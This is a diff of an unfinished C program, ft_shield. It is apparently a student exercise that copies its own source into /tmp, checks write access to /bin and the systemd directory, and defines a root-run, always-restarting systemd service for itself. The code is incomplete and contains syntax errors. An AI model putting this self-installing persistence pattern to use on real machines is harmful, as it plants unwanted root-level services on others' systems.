@@ -1,3 +1,5 @@
+char src[1] = {};
+
 #include <stdbool.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -13,20 +15,22 @@ char target_path[] = "/bin";
 char daemon_config_path[] = "/etc/systemd/system/";
 char service_path[] = "/etc/systemd/system/ft_shield.service";
 char daemon_config[]  = "[Unit]\nDescription=ft_shield\nAfter=network.target\n[Service]\nExecStart=/bin/ft_sheild\nRestart=always\nType=forking\nUser=root\n[Install]\nWantedBy=multi-user.target\n";
-char filePath[500] = ;
+
 
 
 bool in_bin(){
    char cwd[PATH_MAX];
-
    
-    if (getcwd(cwd, sizeof(cwd)) == NULL) 
-        exit(1);
 
-    printf("Current working dir: %s\n", cwd);
+   if (getcwd(cwd, sizeof(cwd)) != NULL) {
+       printf("Current working dir: %s\n", cwd);
+       
+   }else {
+        exit(1);
+   }
+
 
    printf("%s = %s\n", cwd, target_path);
-
    return strcmp(cwd, target_path) == 0;
 }
 
@@ -49,23 +53,14 @@ void start_daemon(){
 }
 
 
-void quine(FILE *fptr){
+void create_yourself(FILE *fptr){
 	fprintf(fptr, "%s", src);
 }
 
 
-
-
-void generate_file_path(){
-
-    memcpy(filePath, "/tmp/file.c",11);
-}
-
-
 void configure_daemon(){
-    
-    generate_file_path();
-    char cmd[200];
+
+	char filePath[] = "/tmp/file.c"
 	FILE* fptr = fopen(filePath, "w+");
 
 
@@ -76,17 +71,18 @@ void configure_daemon(){
 	create_yourself(fptr);
 	printf("------------\n");
 	printf(".c file was created at %s\n", filePath);
-
-    sprintf(cmd, "cc %s -o /bin", filePath);
-    int status = system(cmd);
-
-    if (status == -1 || (WIFEXITED(status)  && WEXITSTATUS(status) != 0 )){
-        printf("Error cmd '%s' exited %d\n", cmd, WEXITSTATUS(status));
-        exit(1);
-    }
-
 	
 	
+	if (access(target_path, W_OK) != 0){
+		printf("oops no access to %s\n", target_path);
+		exit(0);
+	}
+
+
+	if (access(daemon_config_path, W_OK) != 0) {
+		printf("oopss we don't have access to it sorry");
+	}
+
 	printf("------------\n");
 	printf("we have access to write our service");
 	printf("Daemon configuration\n%s", daemon_config);
@@ -121,8 +117,8 @@ int main(){
         printf("we are at bin\n");
     } else {
         printf("ooops we are not at bin\n");
-	   // start_daemon();
-	    //configure_daemon();
+	start_daemon();
+	//configure_daemon();
 
     }
 
